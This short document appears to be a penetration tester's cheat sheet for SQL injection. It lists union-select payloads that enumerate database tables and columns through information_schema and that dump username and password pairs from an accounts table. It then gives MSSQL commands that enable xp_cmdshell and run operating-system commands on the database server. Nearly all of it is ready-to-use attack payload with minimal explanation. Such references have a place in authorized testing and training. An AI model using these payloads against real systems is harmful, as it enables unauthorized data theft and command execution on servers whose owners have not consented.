Use both single quotes and double quotes to look for sql injection vulnerabilities

Use "union select null,null,null" to find out number of columns then use numbers to identify which columns can
be used for data return (ex. "union select 1,2,3,4 --")

Find Tables
```
-1  union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=database()--
```

Find Columns
```
-1  union select 1,group_concat(column_name),3,4,5,6 FROM information_schema.columns WHERE table_name=myfriends--
```

Extract Column Data
```
-1  union select 1,group_concat(username,0x3a,password),3,4,5,6 From dev_accounts--
```

MSSQL Command Injection
```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --

(Now you can run your own commands)
exec xp_cmdshell "whoami"; --
exec master..xp_cmdshell "whoami"; --
```